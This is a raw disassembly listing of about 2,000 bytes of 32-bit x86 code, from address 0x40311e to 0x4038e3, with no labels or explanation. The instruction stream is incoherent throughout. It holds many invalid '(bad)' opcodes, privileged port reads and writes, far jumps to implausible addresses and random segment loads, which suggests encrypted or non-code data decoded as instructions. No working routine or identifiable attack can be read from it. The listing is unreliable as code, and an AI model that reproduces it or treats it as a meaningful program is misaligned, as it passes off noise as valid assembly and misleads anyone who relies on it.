  40311e:	aas    
  40311f:	mov    esi,0xdfa28c75
  403124:	add    eax,0x2a9bc2bf
  403129:	call   0x86982f4f
  40312e:	inc    ebp
  40312f:	ins    DWORD PTR es:[edi],dx
  403130:	jb     0x403174
  403132:	adc    edi,DWORD PTR [esp+ecx*8+0x2ad26693]
  403139:	pop    eax
  40313a:	xlat   BYTE PTR ds:[ebx]
  40313b:	inc    esp
  40313c:	or     cl,BYTE PTR [ebp+0x13c8fb8]
  403142:	clc    
  403143:	pushf  
  403144:	mov    esi,0x54831698
  403149:	(bad)  
  40314a:	push   ds
  40314b:	idiv   BYTE PTR [eax]
  40314d:	mov    esp,0x9ac4e3e
  403152:	mov    al,ds:0x69f11727
  403157:	add    esi,ebx
  403159:	nop
  40315a:	push   ebp
  40315b:	test   BYTE PTR [si+0x47a6],dl
  403160:	mov    ds:0x758f36,eax
  403165:	(bad)  
  403167:	cmp    edi,DWORD PTR [ebx-0xc]
  40316a:	lea    edx,[edi+0x73]
  40316d:	sbb    al,0xdb
  40316f:	mov    eax,ds:0x6e587d20
  403174:	out    0xe4,eax
  403176:	push   ss
  403177:	mov    esi,0x551c3563
  40317c:	adc    bh,cl
  40317e:	or     BYTE PTR [edi],ch
  403180:	test   eax,0xac9ddd86
  403185:	fiadd  WORD PTR [edx]
  403187:	cmc    
  403188:	scas   eax,DWORD PTR es:[edi]
  403189:	or     DWORD PTR [eax],ebp
  40318b:	pop    ebx
  40318c:	out    dx,eax
  40318d:	aad    0x1e
  40318f:	cmp    al,0x60
  403191:	mov    DWORD PTR ds:0xb49959c9,ebx
  403197:	in     al,0x70
  403199:	rcr    BYTE PTR [ecx+0x4a],cl
  40319c:	mov    ch,0xd7
  40319e:	pop    esp
  40319f:	(bad)  
  4031a0:	fwait
  4031a1:	fwait
  4031a2:	xchg   edx,eax
  4031a3:	in     eax,0xb6
  4031a5:	mov    ecx,gs
  4031a7:	rcl    BYTE PTR [esi-0x64],1
  4031aa:	xchg   ebx,eax
  4031ab:	xor    ch,dh
  4031ad:	add    al,0xa
  4031af:	jmp    0xc1eb:0xe1f523ed
  4031b6:	lods   eax,DWORD PTR ds:[esi]
  4031b7:	jns    0x403174
  4031b9:	(bad)  
  4031ba:	int    0x34
  4031bc:	(bad)  
  4031bd:	outs   dx,DWORD PTR ds:[esi]
  4031be:	mov    al,0xbe
  4031c0:	jecxz  0x40318d
  4031c2:	fcomi  st,st(0)
  4031c4:	xor    esi,DWORD PTR [ecx+0x66471b56]
  4031ca:	repz dec esp
  4031cc:	test   BYTE PTR [edx-0x9],bl
  4031cf:	dec    edi
  4031d0:	xchg   ecx,eax
  4031d1:	repnz stos BYTE PTR es:[edi],al
  4031d3:	mov    ebp,0x90eae055
  4031d8:	add    DWORD PTR [ecx],esp
  4031da:	test   BYTE PTR [edx-0x79d3c6c9],bh
  4031e0:	mov    ds:0xdf7c7447,al
  4031e5:	popa   
  4031e6:	jl     0x4031ff
  4031e8:	ja     0x4031fe
  4031ea:	mov    al,ds:0x6ce738a9
  4031ef:	stos   BYTE PTR es:[edi],al
  4031f0:	icebp  
  4031f1:	sbb    eax,0x9ddcb533
  4031f6:	sbb    BYTE PTR [edi],bl
  4031f8:	les    esi,FWORD PTR [eax]
  4031fa:	outs   dx,BYTE PTR ds:[esi]
  4031fb:	dec    edi
  4031fc:	gs jle 0x403191
  4031ff:	test   al,0x6d
  403201:	aas    
  403202:	cmp    eax,0x5f9f2105
  403207:	sbb    edx,ecx
  403209:	sub    al,0x42
  40320b:	int    0x1b
  40320d:	pop    esi
  40320e:	stos   BYTE PTR es:[edi],al
  40320f:	adc    BYTE PTR [ebx+0x1],bl
  403212:	dec    eax
  403213:	retf   
  403214:	std    
  403215:	or     edx,eax
  403217:	cmc    
  403218:	push   es
  403219:	jae    0x40319c
  40321b:	nop
  40321c:	fsub   QWORD PTR [esi]
  40321e:	dec    edi
  40321f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403220:	inc    ecx
  403221:	outs   dx,DWORD PTR ds:[esi]
  403222:	xchg   ebp,eax
  403223:	pop    ss
  403224:	pop    ebp
  403225:	mov    ah,0xba
  403227:	adc    BYTE PTR [ecx-0x2c],cl
  40322a:	fld    st(3)
  40322c:	xlat   BYTE PTR ds:[ebx]
  40322d:	pop    eax
  40322e:	out    0xcd,eax
  403230:	(bad)  
  403231:	stc    
  403232:	loope  0x40320c
  403234:	(bad)  [eax-0x72b28885]
  40323a:	jo     0x403219
  40323c:	retf   
  40323d:	and    DWORD PTR [edx],ebp
  40323f:	add    al,0x8e
  403241:	pop    eax
  403242:	lock popa 
  403244:	icebp  
  403245:	mov    bh,0xff
  403247:	push   ecx
  403248:	add    eax,0xe6e57570
  40324d:	jmp    0xab45:0x9081d50f
  403254:	dec    esi
  403255:	(bad)  
  403256:	jne    0x40325a
  403258:	jp     0x40325a
  40325a:	loope  0x40324c
  40325c:	nop
  40325d:	ja     0x40329e
  40325f:	xor    BYTE PTR [ebx+0x3b],dl
  403262:	clc    
  403263:	psubw  mm5,QWORD PTR [eax]
  403266:	repnz push ds
  403268:	jbe    0x40329f
  40326a:	fidivr WORD PTR [edi+0x11406c3f]
  403270:	mov    esi,0x51b67cdb
  403275:	fimul  WORD PTR [esi]
  403277:	mov    eax,0x50d57a4b
  40327c:	pop    ebx
  40327d:	inc    esp
  40327e:	xor    ah,ch
  403280:	test   DWORD PTR [edi],ebp
  403282:	pop    es
  403283:	outs   dx,DWORD PTR ds:[esi]
  403284:	test   DWORD PTR [ebp+0x68],esi
  403287:	retf   
  403288:	stos   DWORD PTR es:[edi],eax
  403289:	int3   
  40328a:	ins    DWORD PTR es:[edi],dx
  40328b:	push   0xd6469ce1
  403290:	mov    cl,0xe1
  403292:	dec    eax
  403293:	out    dx,al
  403294:	out    0x38,eax
  403296:	xlat   BYTE PTR ds:[ebx]
  403297:	sbb    dl,ah
  403299:	outs   dx,DWORD PTR ds:[esi]
  40329a:	mov    edi,0x857ac10a
  40329f:	sti    
  4032a0:	in     al,dx
  4032a1:	std    
  4032a2:	lods   al,BYTE PTR ds:[esi]
  4032a3:	inc    ebx
  4032a4:	imul   edi,ebx,0xffffffd7
  4032a7:	mov    dl,dl
  4032a9:	repnz sub al,0x5e
  4032ac:	test   al,0x84
  4032ae:	mov    ch,0x90
  4032b0:	les    ecx,FWORD PTR [ebp-0x3d]
  4032b3:	inc    ebp
  4032b4:	sbb    eax,edx
  4032b6:	icebp  
  4032b7:	mov    esi,0x2c2003f9
  4032bc:	fidiv  WORD PTR [ecx+0xc]
  4032bf:	push   0x2ff43d51
  4032c4:	clc    
  4032c5:	xor    BYTE PTR [edx],al
  4032c7:	sbb    DWORD PTR [edi+0x7],edi
  4032ca:	fldenv [eax]
  4032cc:	xor    DWORD PTR [esi-0x50eef662],ebp
  4032d2:	adc    ebp,edx
  4032d4:	mov    ch,0xad
  4032d6:	pop    edi
  4032d7:	push   ebx
  4032d8:	xor    cl,dl
  4032da:	cli    
  4032db:	xchg   BYTE PTR [ebp-0x70],ch
  4032de:	xchg   ecx,eax
  4032df:	cld    
  4032e0:	push   esi
  4032e1:	and    eax,0x490c034b
  4032e6:	ror    BYTE PTR [si-0x3a],cl
  4032ea:	sub    ebx,ebx
  4032ec:	or     eax,0x1233b2d3
  4032f1:	(bad)
  4032f4:	pop    ds
  4032f5:	imul   esp,DWORD PTR [eax-0x39d59449],0x9970ffe7
  4032ff:	inc    esp
  403300:	lea    eax,[eax-0x7d86abb2]
  403306:	repz (bad) 
  403309:	call   0xa69ec1e0
  40330e:	sub    eax,0x4c69f71b
  403313:	clc    
  403314:	pop    es
  403315:	cmc    
  403316:	add    BYTE PTR [ebx+0x5f3c694b],0x4b
  40331d:	into   
  40331e:	in     al,dx
  40331f:	aad    0xb9
  403321:	mov    bh,0xbf
  403323:	inc    ebp
  403324:	push   eax
  403325:	iret   
  403326:	mov    eax,0x451f1668
  40332b:	inc    esi
  40332c:	mov    ds:0xdcd574dc,al
  403331:	arpl   WORD PTR [eax-0x63],bp
  403334:	test   DWORD PTR ds:0x2f666106,ebp
  40333a:	ins    BYTE PTR es:[edi],dx
  40333b:	iret   
  40333c:	push   0xdef79dfb
  403341:	jg     0x403399
  403343:	mov    dh,BYTE PTR [eax+0x61b9fe62]
  403349:	stc    
  40334a:	icebp  
  40334b:	xchg   DWORD PTR [esi-0x3d19cf9f],esp
  403351:	gs inc edi
  403353:	cdq    
  403354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403355:	scas   eax,DWORD PTR es:[edi]
  403356:	pusha  
  403357:	cs push ebp
  403359:	test   al,0x24
  40335b:	mov    eax,0xdb579226
  403360:	fdivr  QWORD PTR [ebx-0x13]
  403363:	bound  ebp,QWORD PTR [ebp-0x523a186e]
  403369:	aas    
  40336a:	ficom  DWORD PTR ds:0x153ac555
  403370:	push   ss
  403371:	sbb    BYTE PTR [edx-0x6b],cl
  403374:	mov    bh,0x14
  403376:	neg    edi
  403378:	fisttp DWORD PTR [ebp-0x74]
  40337b:	cmp    al,0xa5
  40337d:	neg    BYTE PTR ds:[ebx+esi*8]
  403381:	adc    eax,0x9120e9f
  403386:	mov    ch,0xce
  403388:	outs   dx,DWORD PTR ds:[esi]
  403389:	xchg   esi,eax
  40338a:	sub    eax,0x87026206
  40338f:	sti    
  403390:	mov    ds:0xe04c75fb,al
  403395:	(bad)  
  403396:	lods   al,BYTE PTR ds:[esi]
  403397:	adc    eax,DWORD PTR [edx+0xe]
  40339a:	pop    ebp
  40339b:	xchg   ebp,eax
  40339c:	push   ss
  40339d:	clc    
  40339e:	ror    BYTE PTR [edx-0xa],0xb0
  4033a2:	push   eax
  4033a3:	xor    eax,0x1ba1a912
  4033a8:	pop    esp
  4033a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033aa:	shr    DWORD PTR [esi+edi*8-0x16],0xac
  4033af:	loopne 0x403358
  4033b1:	push   eax
  4033b2:	addr16 cdq 
  4033b4:	pop    esp
  4033b5:	pop    esi
  4033b6:	mov    ch,0xde
  4033b8:	test   al,0x7
  4033ba:	js     0x4033c7
  4033bc:	int    0x20
  4033be:	fdivr  DWORD PTR [ecx-0x5e]
  4033c1:	test   al,0xb5
  4033c3:	xchg   edx,eax
  4033c4:	fcomp  QWORD PTR [edi+0x3f3f7e29]
  4033ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033cb:	call   0x1fa4580c
  4033d0:	mov    esp,0x645a21b3
  4033d5:	(bad)  
  4033d6:	push   eax
  4033d7:	repz adc BYTE PTR [esi-0x3d6c1fc2],dl
  4033de:	mov    ebx,0xac2cd84a
  4033e3:	(bad)  
  4033e4:	mov    eax,ds:0xe2e14559
  4033e9:	arpl   WORD PTR [edx],cx
  4033eb:	mov    ebx,0x5ee971aa
  4033f0:	push   ecx
  4033f1:	push   ebp
  4033f2:	fcomp  QWORD PTR [edi+0x5]
  4033f5:	sub    eax,0xbc56fc32
  4033fa:	pop    edi
  4033fb:	cwde   
  4033fc:	gs test edx,0x91ec8b16
  403403:	arpl   di,bx
  403405:	mov    dl,BYTE PTR [ebp-0x541380bb]
  40340b:	mov    ch,0x2
  40340d:	out    0x7a,eax
  40340f:	cmp    DWORD PTR [ebp-0x21],ebx
  403412:	jecxz  0x40346b
  403414:	mov    ah,BYTE PTR [edi]
  403416:	xchg   esi,eax
  403417:	ss and eax,0x8dacdae5
  40341d:	(bad)  
  40341e:	xchg   ebx,eax
  40341f:	lock pop esp
  403421:	push   ebx
  403422:	test   al,0xd3
  403424:	jns    0x403437
  403426:	sbb    DWORD PTR [ebx],eax
  403428:	mov    cl,0x3e
  40342a:	adc    al,0x85
  40342c:	inc    edx
  40342d:	std    
  40342e:	mov    esp,0xbe400aa7
  403433:	jle    0x403470
  403435:	imul   ebx,DWORD PTR [edi+0x1e86bde4],0x86a4e70d
  40343f:	jnp    0x403418
  403441:	fild   WORD PTR [ebp-0x46]
  403444:	xor    ecx,eax
  403446:	arpl   WORD PTR [edi-0x1e],ax
  403449:	xor    DWORD PTR [eax],eax
  40344b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40344c:	cmp    esp,DWORD PTR [edi-0x46071cec]
  403452:	mov    cl,0x5a
  403454:	imul   edx,edi,0x23
  403457:	mov    eax,0xcac7e125
  40345c:	xor    al,0xd8
  40345e:	pop    esp
  40345f:	mov    ds:0xe010b65d,al
  403464:	sub    cl,BYTE PTR [ebx+0x41f71240]
  40346a:	adc    BYTE PTR [ebp+0x33],0x5e
  40346e:	or     BYTE PTR [eax],0x17
  403471:	xor    ch,0xda
  403474:	dec    ebx
  403475:	mov    es,WORD PTR [edi]
  403477:	cwde   
  403478:	iret   
  403479:	dec    esp
  40347a:	jle    0x4034ee
  40347c:	rep outs dx,BYTE PTR ds:[esi]
  40347e:	dec    esp
  40347f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403480:	fadd   st,st(0)
  403482:	in     eax,0xfe
  403484:	sbb    ch,BYTE PTR [edx-0x76]
  403487:	rcr    DWORD PTR [ecx-0x14],cl
  40348a:	(bad)  
  40348b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40348c:	inc    eax
  40348d:	and    BYTE PTR [eax+edx*2+0x3a7e3268],0x5d
  403495:	mov    ch,0x97
  403497:	in     eax,0x4a
  403499:	sub    BYTE PTR [esi+0x744a47f5],ch
  40349f:	and    al,0x7f
  4034a1:	add    BYTE PTR [ebx+0x61686bbd],al
  4034a7:	cmp    al,0xa3
  4034a9:	(bad)  
  4034aa:	in     al,dx
  4034ab:	fs jne 0x40342f
  4034ae:	lods   al,BYTE PTR ds:[esi]
  4034af:	loopne 0x4034a0
  4034b1:	pop    ecx
  4034b2:	std    
  4034b3:	aaa    
  4034b4:	clc    
  4034b5:	adc    BYTE PTR [ebp-0x5d],ah
  4034b8:	out    0xa0,eax
  4034ba:	add    al,0xf8
  4034bc:	in     al,0x63
  4034be:	sub    DWORD PTR [eax],esi
  4034c0:	adc    esi,eax
  4034c2:	nop
  4034c3:	xor    DWORD PTR [ebx],ebp
  4034c5:	mov    al,ds:0x8a5c7525
  4034ca:	mov    esi,cs
  4034cc:	sbb    ebx,edi
  4034ce:	mov    ds:0xd1140157,eax
  4034d3:	pop    edx
  4034d4:	sahf   
  4034d5:	call   0xdbe119ce
  4034da:	cld    
  4034db:	or     BYTE PTR [esp+edx*2-0x4fa79428],0x48
  4034e3:	pop    esi
  4034e4:	mov    BYTE PTR [esi],cl
  4034e6:	lods   al,BYTE PTR ds:[esi]
  4034e7:	clc    
  4034e8:	popa   
  4034e9:	sub    DWORD PTR [esi+0x65],esp
  4034ec:	aas    
  4034ed:	fwait
  4034ee:	cmp    al,0x2b
  4034f0:	jmp    0x9207d0
  4034f5:	xor    eax,0xca7d9c2a
  4034fa:	xchg   esi,eax
  4034fb:	fld    DWORD PTR [esi]
  4034fd:	xchg   ebx,eax
  4034fe:	fcmovne st,st(7)
  403500:	mov    ds:0x2798334b,eax
  403505:	ficomp WORD PTR [ecx]
  403507:	fs pop edx
  403509:	(bad)  
  40350b:	cmp    al,BYTE PTR [ecx-0x28]
  40350e:	dec    ebp
  40350f:	adc    al,0x36
  403511:	push   ds
  403512:	mov    dh,0xaa
  403514:	mov    ebx,0x98b9d45f
  403519:	pushf  
  40351a:	stc    
  40351b:	cdq    
  40351c:	(bad)  
  40351d:	push   ds
  40351e:	inc    ebx
  40351f:	in     al,dx
  403520:	pop    edi
  403521:	sbb    BYTE PTR [esi+0x5dec8af5],cl
  403527:	in     eax,dx
  403528:	push   edi
  403529:	mov    bh,0x0
  40352b:	inc    edi
  40352c:	loope  0x4034e4
  40352e:	xchg   ecx,eax
  40352f:	(bad)  
  403530:	mov    ebp,0xd61081dd
  403535:	icebp  
  403536:	stos   DWORD PTR es:[edi],eax
  403537:	repz push esp
  403539:	sbb    DWORD PTR [ebp+0x31],0x2b
  40353d:	push   ebp
  40353e:	out    0xf5,eax
  403540:	jmp    0xf70dbbbe
  403545:	jns    0x403591
  403547:	outs   dx,DWORD PTR ds:[esi]
  403548:	dec    edx
  403549:	cld    
  40354a:	push   eax
  40354b:	dec    esp
  40354c:	and    esi,edi
  40354e:	adc    al,0x22
  403550:	jle    0x4034e7
  403552:	(bad)  
  403553:	(bad)  
  403554:	dec    ecx
  403555:	loop   0x4034fa
  403557:	sub    al,0xb
  403559:	mov    dh,0x65
  40355b:	(bad)  
  40355c:	jne    0x4035bd
  40355e:	popf   
  40355f:	inc    esp
  403560:	retf   0xfc0e
  403563:	push   ss
  403564:	adc    ecx,DWORD PTR [ebx-0x78]
  403567:	cli    
  403568:	and    eax,0xd6c13697
  40356d:	dec    ecx
  40356e:	ficomp WORD PTR [ebp+0xc]
  403571:	push   esp
  403572:	icebp  
  403573:	add    dl,BYTE PTR [edi]
  403575:	call   0xa9054f13
  40357a:	push   eax
  40357b:	sub    WORD PTR [ebx+0x64],dx
  40357f:	jns    0x40352d
  403581:	dec    ecx
  403582:	pop    ecx
  403583:	mov    cs,WORD PTR [edx-0x42]
  403586:	pop    ss
  403587:	ret    
  403588:	jge    0x403584
  40358a:	mov    ds:0x9de1f5,eax
  40358f:	push   eax
  403590:	cmp    DWORD PTR [eax],esi
  403592:	lahf   
  403593:	jbe    0x403554
  403595:	nop
  403596:	jl     0x40359c
  403598:	and    bl,BYTE PTR [ebp-0x3614647c]
  40359e:	lea    eax,[edx-0x40]
  4035a1:	fidivr DWORD PTR [edi]
  4035a3:	mov    WORD PTR [ecx+0x1],cs
  4035a6:	mov    ebx,0x3d5bde1e
  4035ab:	in     al,0x7c
  4035ad:	mov    bl,0xa2
  4035af:	cld    
  4035b0:	mov    ebp,0x7f629618
  4035b5:	jo     0x40361e
  4035b7:	mov    ecx,DWORD PTR [edi+eax*4+0x3f]
  4035bb:	fidiv  WORD PTR [esi]
  4035bd:	add    al,0x7a
  4035bf:	mov    edx,esi
  4035c1:	sub    DWORD PTR [eax+0x49543a01],esi
  4035c7:	inc    esp
  4035c8:	ret    0xf426
  4035cb:	int3   
  4035cc:	in     al,dx
  4035cd:	ja     0x403610
  4035cf:	push   ss
  4035d0:	leave  
  4035d1:	mov    ch,BYTE PTR [ecx-0x35ad5283]
  4035d7:	xor    eax,0x24545963
  4035dc:	push   ebx
  4035dd:	push   edx
  4035de:	mov    ds,WORD PTR [ebp+0x324beef7]
  4035e4:	and    bl,al
  4035e6:	(bad)  
  4035e7:	jno    0x40357a
  4035e9:	inc    esi
  4035ea:	mov    gs,esi
  4035ec:	cmovs  ecx,DWORD PTR [ebp-0x22]
  4035f0:	sbb    BYTE PTR [eax+0x66],ch
  4035f3:	adc    al,0x9f
  4035f5:	out    dx,al
  4035f6:	push   ebp
  4035f7:	stc    
  4035f8:	jmp    0x93f0:0x1e47e814
  4035ff:	jge    0x4035ec
  403601:	cld    
  403602:	push   0xc3930248
  403607:	jmp    ebp
  403609:	hlt    
  40360a:	jns    0x40359d
  40360c:	mov    ch,0x5e
  40360e:	jns    0x403625
  403610:	jbe    0x40359a
  403612:	into   
  403613:	pushf  
  403614:	data16 ins BYTE PTR es:[edi],dx
  403616:	leave  
  403617:	xor    edx,eax
  403619:	fcom   DWORD PTR [eax-0xf]
  40361c:	fwait
  40361d:	test   al,0x6c
  40361f:	xor    BYTE PTR [ebp+0x4a4128ce],dl
  403625:	and    al,0x94
  403627:	bound  ebx,QWORD PTR ds:0x5271d7e4
  40362d:	jg     0x403644
  40362f:	xchg   DWORD PTR [esi+0x5f30369a],esi
  403635:	and    cl,BYTE PTR [edi-0x1c]
  403638:	mov    ecx,0x77bba7d4
  40363d:	cli    
  40363e:	sar    DWORD PTR [esi+0x7837b017],1
  403644:	cmp    DWORD PTR ds:0x41653a87,ebx
  40364a:	push   0xffffff86
  40364c:	pusha  
  40364d:	dec    eax
  40364e:	mov    ds:0xb3a4d6fe,eax
  403653:	aad    0x62
  403655:	ins    BYTE PTR es:[edi],dx
  403656:	dec    ecx
  403657:	xor    DWORD PTR [ebx+eax*1+0x7e52a383],eax
  40365e:	inc    DWORD PTR [esp+eax*2]
  403661:	mov    esp,0xdd39ad08
  403666:	addr16 mov ds:0x8a6d,eax
  40366a:	fist   WORD PTR [ecx-0x6181b4e9]
  403670:	cmp    DWORD PTR [ebx-0x233a5689],0xffffffe6
  403677:	xchg   edi,eax
  403678:	cmp    al,0x7c
  40367a:	int3   
  40367b:	pop    ds
  40367c:	push   ecx
  40367d:	add    ch,BYTE PTR [edx+eiz*4+0x78]
  403681:	or     eax,0x38b57a44
  403686:	sbb    BYTE PTR [edx+0x70290bcc],dh
  40368c:	jecxz  0x40363a
  40368e:	mov    cl,0x36
  403690:	pop    ecx
  403691:	loop   0x4036f0
  403693:	data16 mov dl,0xd2
  403696:	or     DWORD PTR [ecx+0x42],0xffffffea
  40369a:	cli    
  40369b:	sub    DWORD PTR [eax],eax
  40369d:	mov    edx,DWORD PTR [ebp+eax*1-0x4b]
  4036a1:	add    BYTE PTR [ecx+0x5a],ch
  4036a4:	gs sbb eax,0x1c3116f7
  4036aa:	mov    ch,0x55
  4036ac:	push   ebx
  4036ad:	je     0x403632
  4036af:	bound  esi,QWORD PTR [edi]
  4036b1:	sub    al,0xf6
  4036b3:	scas   eax,DWORD PTR es:[edi]
  4036b4:	out    0xe3,al
  4036b6:	ins    DWORD PTR es:[edi],dx
  4036b7:	fisubr DWORD PTR [ecx+edi*8+0x24]
  4036bb:	icebp  
  4036bc:	stos   BYTE PTR es:[edi],al
  4036bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036be:	outs   dx,DWORD PTR fs:[esi]
  4036c0:	in     al,dx
  4036c1:	repz sbb eax,0x409be038
  4036c7:	mov    dh,0x72
  4036c9:	nop
  4036ca:	popa   
  4036cb:	rep stos DWORD PTR es:[edi],eax
  4036cd:	mov    cl,0xc
  4036cf:	outs   dx,BYTE PTR ds:[esi]
  4036d0:	mov    edx,0x2dd7c105
  4036d5:	aam    0x8f
  4036d7:	scas   al,BYTE PTR es:[edi]
  4036d8:	dec    eax
  4036d9:	leave  
  4036da:	dec    ecx
  4036db:	in     eax,0x9a
  4036dd:	push   cs
  4036de:	add    edx,DWORD PTR [edi+0x2fc9294b]
  4036e4:	stos   DWORD PTR es:[edi],eax
  4036e5:	push   esp
  4036e6:	gs dec edi
  4036e8:	pop    ecx
  4036e9:	add    al,0x1c
  4036eb:	jmp    0xabce25f6
  4036f0:	sbb    BYTE PTR [ecx+eax*2+0x6625454e],bl
  4036f7:	xchg   edx,eax
  4036f8:	clc    
  4036f9:	ja     0x4036a1
  4036fb:	iret   
  4036fc:	shl    BYTE PTR [edx+0x34],cl
  4036ff:	sbb    al,0xc3
  403701:	add    eax,0x8d9bf626
  403706:	mov    ecx,0xd438d155
  40370b:	nop
  40370c:	push   ecx
  40370d:	cmp    esp,DWORD PTR [esi+0x4cb31979]
  403713:	add    eax,0x38a8d017
  403718:	sub    eax,0x1666e9e4
  40371d:	or     cl,bh
  40371f:	mov    ah,0x6c
  403721:	cmp    eax,0xe7b199ef
  403726:	xchg   esi,eax
  403727:	push   edi
  403728:	cld    
  403729:	xor    BYTE PTR [edx],0x74
  40372c:	cmc    
  40372d:	xlat   BYTE PTR ds:[ebx]
  40372e:	test   eax,0x5f0a47af
  403733:	push   edx
  403734:	(bad)  
  403735:	cmp    edi,DWORD PTR ds:0xfba70d89
  40373b:	pop    ds
  40373c:	or     eax,0x3ba502cb
  403741:	jle    0x4037ae
  403743:	jns    0x4036f5
  403745:	fldenv [edx-0x44]
  403748:	lods   al,BYTE PTR ds:[esi]
  403749:	in     eax,dx
  40374a:	stos   BYTE PTR es:[edi],al
  40374b:	xchg   esi,eax
  40374c:	stc    
  40374d:	jp     0x403742
  40374f:	mov    ds:0xd43a2c34,al
  403754:	push   0x7cac10d8
  403759:	sub    BYTE PTR [eax],0x59
  40375c:	sbb    ecx,DWORD PTR [eax]
  40375e:	loopne 0x40376f
  403760:	fdiv   DWORD PTR [eax-0x1cfb0593]
  403766:	jo     0x403735
  403768:	xor    al,0x10
  40376a:	add    al,0x31
  40376c:	out    dx,al
  40376d:	adc    ah,dh
  40376f:	daa    
  403770:	jae    0x403767
  403772:	inc    edx
  403773:	jmp    0x19a9a938
  403778:	repz jae 0x4037a8
  40377b:	sbb    al,0xf1
  40377d:	jo     0x4037c5
  40377f:	inc    eax
  403780:	xor    al,0x5a
  403782:	add    edi,DWORD PTR [ebx-0x47]
  403785:	pop    esp
  403786:	mov    dh,0x96
  403788:	sahf   
  403789:	dec    esi
  40378a:	dec    esp
  40378b:	push   ebx
  40378c:	loope  0x403796
  40378e:	sbb    ah,bl
  403790:	jb     0x4037f5
  403792:	ret    
  403793:	retf   0x2db1
  403796:	js     0x40379a
  403798:	mov    dl,0x3c
  40379a:	inc    edi
  40379b:	loope  0x403789
  40379d:	addr16 int3 
  40379f:	add    al,0x5a
  4037a1:	mov    ds:0x12fb642d,al
  4037a6:	cli    
  4037a7:	mov    eax,ds:0x5e81168d
  4037ac:	pop    esp
  4037ad:	sbb    eax,0xcbe66712
  4037b2:	mov    dh,ah
  4037b4:	call   FWORD PTR [eax+eax*2-0x30455512]
  4037bb:	mov    edx,0xb87a70c1
  4037c0:	unpcklps xmm4,xmm6
  4037c3:	outs   dx,DWORD PTR ds:[esi]
  4037c4:	mov    eax,ds:0x98950ce
  4037c9:	sbb    dh,al
  4037cb:	sbb    eax,0x55e6f06
  4037d0:	adc    DWORD PTR [ecx+0x62],edi
  4037d3:	ss and cl,ah
  4037d6:	dec    esp
  4037d7:	xchg   esp,eax
  4037d8:	adc    eax,ecx
  4037da:	xchg   ebx,eax
  4037db:	push   ds
  4037dc:	in     eax,0xe4
  4037de:	not    DWORD PTR [edi+0x0]
  4037e1:	cld    
  4037e2:	loope  0x40378b
  4037e4:	idiv   bh
  4037e6:	sbb    ecx,edx
  4037e8:	add    bh,BYTE PTR [edx]
  4037ea:	mov    esi,0x90da6218
  4037ef:	inc    esi
  4037f0:	pop    edx
  4037f1:	jg     0x403804
  4037f3:	cli    
  4037f4:	sbb    BYTE PTR [eax],ah
  4037f6:	mov    edi,0xa6400da4
  4037fb:	jmp    0xc8447303
  403800:	xchg   esp,eax
  403801:	jecxz  0x4037a2
  403803:	repnz std 
  403805:	(bad)  
  403806:	xchg   ebx,eax
  403807:	shl    DWORD PTR [eax],0x5f
  40380a:	repz jno 0x403811
  40380d:	jmp    0x403848
  40380f:	ins    BYTE PTR es:[edi],dx
  403810:	ja     0x403874
  403812:	dec    edi
  403813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403814:	sar    dh,1
  403816:	cli    
  403817:	ins    DWORD PTR es:[edi],dx
  403818:	retf   0x21e0
  40381b:	ins    BYTE PTR es:[edi],dx
  40381c:	pop    ebp
  40381d:	sbb    al,al
  40381f:	fiadd  DWORD PTR [edx-0x74]
  403822:	and    cl,BYTE PTR [ebp-0x74bade46]
  403828:	fldenv fs:[edx-0x2c39b8f3]
  40382f:	repz sbb cl,BYTE PTR [ebx]
  403832:	(bad)  
  403834:	adc    cl,BYTE PTR [esi-0x6a]
  403837:	sysenter 
  403839:	lock pusha 
  40383b:	push   eax
  40383c:	or     al,0x95
  40383e:	fcomp  QWORD PTR [ebx+0x2b412c03]
  403844:	cmp    DWORD PTR [esi+0x20],eax
  403847:	add    eax,0x3c9e08c8
  40384c:	dec    edx
  40384d:	icebp  
  40384e:	das    
  40384f:	nop
  403850:	arpl   WORD PTR [edi+0x3331821c],bp
  403856:	and    bl,BYTE PTR [ebp+0x28554e0b]
  40385c:	pop    es
  40385d:	add    BYTE PTR ds:0xfd30cf9d,ch
  403863:	stc    
  403864:	imul   edi,DWORD PTR [edx-0x2b],0x53c6543d
  40386b:	retf   
  40386c:	add    dl,ch
  40386e:	out    0xca,eax
  403870:	fwait
  403871:	pushf  
  403872:	or     al,0xa2
  403874:	and    cl,dh
  403876:	sbb    eax,0x7595b7cf
  40387b:	rcr    BYTE PTR [ecx+eax*1+0x25da8db7],1
  403882:	inc    edx
  403883:	mov    ch,0x2f
  403885:	ins    BYTE PTR es:[edi],dx
  403886:	fdiv   QWORD PTR [edi]
  403888:	scas   eax,DWORD PTR es:[edi]
  403889:	out    0xe2,eax
  40388b:	fidivr DWORD PTR ds:0xaf525807
  403891:	xchg   ebx,eax
  403892:	popf   
  403893:	and    DWORD PTR [edi+0x79b12c5a],edi
  403899:	je     0x4038f8
  40389b:	(bad)  
  40389c:	or     BYTE PTR [edx+0x7cc7d120],dl
  4038a2:	mov    ebp,0xb378fa27
  4038a7:	push   ds
  4038a8:	(bad)  
  4038a9:	lods   eax,DWORD PTR ds:[esi]
  4038aa:	test   eax,0xfeb76cc3
  4038af:	in     al,0x47
  4038b1:	jmp    0x3bfa:0x3acb415
  4038b8:	outs   dx,BYTE PTR ds:[esi]
  4038b9:	xchg   esi,eax
  4038ba:	js     0x4038bc
  4038bc:	sbb    ebx,DWORD PTR [ecx]
  4038be:	push   edx
  4038bf:	jmp    0xb273c97a
  4038c4:	sbb    DWORD PTR [ecx-0x20],esi
  4038c7:	mov    WORD PTR [ecx+eax*4+0x14],ss
  4038cb:	lods   al,BYTE PTR ds:[esi]
  4038cc:	leave  
  4038cd:	mov    ds:0xaffcfc0e,al
  4038d2:	hlt    
  4038d3:	cdq    
  4038d4:	cmp    al,0x5b
  4038d6:	and    al,BYTE PTR [edi]
  4038d8:	mov    bh,0xf5
  4038da:	arpl   WORD PTR [ebp-0x28],cx
  4038dd:	daa    
  4038de:	mov    ebp,0xd5ca583c
  4038e3:	mov    bl,BYTE PTR [edi+0x5dc97d39]
